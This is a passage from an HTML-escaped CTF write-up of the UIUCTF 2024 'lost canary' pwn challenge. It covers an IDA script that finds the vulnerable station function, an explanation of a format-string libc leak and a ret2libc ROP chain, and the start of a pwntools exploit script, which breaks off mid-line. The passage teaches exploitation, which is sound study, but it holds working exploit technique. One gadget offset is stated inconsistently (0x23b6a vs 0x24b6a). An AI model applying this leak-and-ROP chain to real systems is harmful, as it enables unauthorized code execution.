&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#123;station_number: canary_value&amp;#125; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    if the canary does not contain a newline  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data_addr = &lt;span class=&#34;number&#34;&gt;0x555555C13010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canaries = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dicky = &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;32767&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        canary = idaapi.get_bytes(i * &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; + data_addr, &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;quot;\x0a&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; (canary):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            dicky[i] = canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; dicky&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_func_names&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;xrefs&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    given all addresses calling _gets, &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    generate a list of all the station numbers &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    calling_func_names = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; xrefs:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        func_name = idaapi.get_func(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        func_addr = func_name.start_ea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        calling_func_names.append(func_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; calling_func_names&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# address of the label _gets&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets_addr = &lt;span class=&#34;number&#34;&gt;0x555555555180&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# generate list of all addresses calling _gets&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    xrefs = find_xrefs_to(gets_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# get the names of all the functions calling _gets&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    calling_gets = get_func_names(xrefs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# get list of all the stack canaries not containing a newline&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canaries = get_stack_canaries()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# retrieve just station numbers&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    station_numbers = canaries.keys()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# find out if any address lies in both generated lists&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; station_numbers:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        func_name = &lt;span class=&#34;string&#34;&gt;&amp;quot;station_&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        addr = idaapi.get_name_ea(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, func_name)        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; addr &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; calling_gets:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;And the output of this script gives us the address of  &lt;code&gt;station_14927&lt;/code&gt; : the vulnerable one.&lt;/p&gt;
&lt;h2 id=&#34;step-4-exploiting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step-4-exploiting&#34;&gt;#&lt;/a&gt; Step 4: Exploiting&lt;/h2&gt;
&lt;p&gt;Now that we have the vulnerable function, let us get down to exploiting it. From the Dockerfile we saw earlier, the idea is to get a shell and do  &lt;code&gt;cat flag.txt&lt;/code&gt; , so let&#39;s see how we can do it.&lt;/p&gt;
&lt;p&gt;Back to the format string vulnerability.&lt;/p&gt;
&lt;p&gt;We know the  &lt;code&gt;printf()&lt;/code&gt;  in  &lt;code&gt;select_station&lt;/code&gt;  is vulnerable, and we know why. Let us view the register state before the  &lt;code&gt;printf()&lt;/code&gt;  call in  &lt;code&gt;select_station&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-16.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Running  &lt;code&gt;info proc mappings&lt;/code&gt;  on GDB tells us what is mapped to where in virtual memory, so we can make use of that here&lt;/p&gt;
&lt;p&gt;We can see that the address that  &lt;code&gt;rsi&lt;/code&gt;  contains is actually a LIBC address!&lt;/p&gt;
&lt;p&gt;We can assume ASLR is on for this program.&lt;/p&gt;
&lt;p&gt;One interesting thing to note about ASLR is that while it does modify the actual addresses of variables and functions in your program, it usually does not touch the distance between these variables (this distance is also known as an &amp;quot;offset&amp;quot;).&lt;/p&gt;
&lt;p&gt;For example, if we run a program for the first time, and a variable  &lt;code&gt;x&lt;/code&gt;  is at address  &lt;code&gt;0x1000&lt;/code&gt; , and a variable  &lt;code&gt;y&lt;/code&gt;  is at  &lt;code&gt;0x1050&lt;/code&gt; , and we run this program for a second time, we would see that the address of the variable  &lt;code&gt;x&lt;/code&gt;  has now changed to  &lt;code&gt;0x1450&lt;/code&gt; , but  &lt;code&gt;y&lt;/code&gt;  remains a constant offset from it at  &lt;code&gt;0x14a0&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;This is because it would take way too long for ASLR to randomise the locations of &lt;em&gt;every&lt;/em&gt; single variable in a given program. What is does instead is randomise the &lt;em&gt;base&lt;/em&gt; address of various memory mappings, one of which is LIBC.&lt;/p&gt;
&lt;p&gt;We can utilise this fact to find the base address of  &lt;code&gt;libc&lt;/code&gt;  every time the program is run. This is known as a  &lt;code&gt;ret2libc&lt;/code&gt;  attack&lt;/p&gt;
&lt;p&gt;There are 4 main steps to  &lt;code&gt;ret2libc&lt;/code&gt;  attacks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Find an address that points to something in the libc by using something like a format string vulnerability&lt;/li&gt;
&lt;li&gt;Use the address above to calculate the base address of libc&lt;/li&gt;
&lt;li&gt;Calculate addresses of any libc functions we like using the base address&lt;/li&gt;
&lt;li&gt;Use a different exploit (BOF in our case) to overwrite the return address with the libc function we would like to jump to&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let us leak an address as an example, by running the program with the input &amp;quot;14927-%p-&amp;quot;&lt;/p&gt;
&lt;p&gt;The output I get is:  &lt;code&gt;0x7ffff7fc2723&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-17.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;All I have to do, is subtract the base address of the  &lt;code&gt;libc&lt;/code&gt;  I have (highlighted in the screenshot), from it, to get the constant offset difference, which comes out to be:  &lt;code&gt;0x1ed723&lt;/code&gt; . I can use this information to get the base address of the libc every time the program is run now, through the format string vulnerability in  &lt;code&gt;main()&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;Return Oriented Programming comes in handy when buffer overflows allow us to overwrite a program&#39;s call stack with what we want. Instead of us having to craft our own shellcode, all we have to do is take already existing pieces of code (known as &amp;quot;gadgets&amp;quot;) and put them together to craft our exploit - we will see how we can do that.&lt;/p&gt;
&lt;p&gt;These gadgets are usually short bursts of instructions tailored to do specific things, each ending with a  &lt;code&gt;ret&lt;/code&gt;  instruction. We can utilise this to control execution flow as per our will.&lt;/p&gt;
&lt;p&gt;The beauty of ROP comes from it&#39;s unique ability to harness code from any part of the binary (given it is executable).&lt;/p&gt;
&lt;p&gt;First, we need to go gadget hunting to find what we need. Since we can write what we want to the stack, and we know  &lt;code&gt;rdi&lt;/code&gt;  is the first place looked at by functions for their arguments, we would ideally want something that would allow us to pop the top value from the stack and into  &lt;code&gt;rdi&lt;/code&gt; , then perform a  &lt;code&gt;ret&lt;/code&gt; . Let us look for such an instruction in the libc with a tool known as &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0pvbmF0aGFuU2Fsd2FuL1JPUGdhZGdldA==&#34;&gt;ROPgadget&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ ROPgadget --binary ./libc.so.6 | grep &amp;quot;pop rdi ; ret&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000023b6a : pop rdi ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x00000000000f57ad : pop rdi ; retf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000144ba9 : pop rdi ; retf 0xa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;We can take the first one and ignore the rest. The output shows that at the offset  &lt;code&gt;0x24b6a&lt;/code&gt;  from the libc base, is the gadget we are looking for.&lt;/p&gt;
&lt;p&gt;Next, we also need to find a  &lt;code&gt;ret&lt;/code&gt;  instruction.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ ROPgadget --binary ./libc.so.6 | awk &amp;#x27;&amp;#123;print $1 $2 $3&amp;#125;&amp;#x27; | grep ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000022679:ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;So  &lt;code&gt;ret&lt;/code&gt;  is at 0x22679.&lt;/p&gt;
&lt;p&gt;Now, we are ready to craft our payload that does the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Send 4 &amp;quot;A&amp;quot;s and the canary to get to the return address on the stack&lt;/li&gt;
&lt;li&gt;Overwrite the return address on the stack with the  &lt;code&gt;pop rdi&lt;/code&gt;  gadget&lt;/li&gt;
&lt;li&gt;Set the value of  &lt;code&gt;rdi&lt;/code&gt;  to &amp;quot;/bin/sh&amp;quot;&lt;/li&gt;
&lt;li&gt;Overwrite the return address again with with the address of system&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let us see how this can be accomplished with a full fledged pwntools script&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; icecream &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; tty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Set up pwntools for the correct architecture&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exe = &lt;span class=&#34;string&#34;&gt;&amp;quot;./lost&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./libc.so.6&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.binary = elf = ELF(exe)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.aslr = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;start&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;argv=[], *a, **kw&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;Start the exploit against the target.&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; args.REMOTE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;lost-canary.chal.uiuc.tf&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1337&lt;/span&gt;, ssl=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; args.GDB:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; process([exe] + argv, *a, **kw)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdbscript = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    b* select_station+104&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(**&lt;span class=&#34;built_in&#34;&gt;locals&lt;/span&gt;())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Useful macros&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sl&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.sendline(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;s&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.send(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sa&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a, b&lt;/span&gt;): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.sendafter(a, b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sla&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a, b&lt;/span&gt;): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.sendlineafter(a, b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;re&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.recv(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ru&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.recvuntil(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;rl&lt;/span&gt;(): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;i&lt;/span&gt;(): &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eof = &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(tty.CEOF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# send the payload to generate the libc leak &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(&lt;span class=&#34;string&#34;&gt;b&amp;quot;14927-%p-&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;b&amp;quot;-&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.address = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(ru(&lt;span class=&#34;string&#34;&gt;b&amp;quot;-&amp;quot;&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) - &lt;span 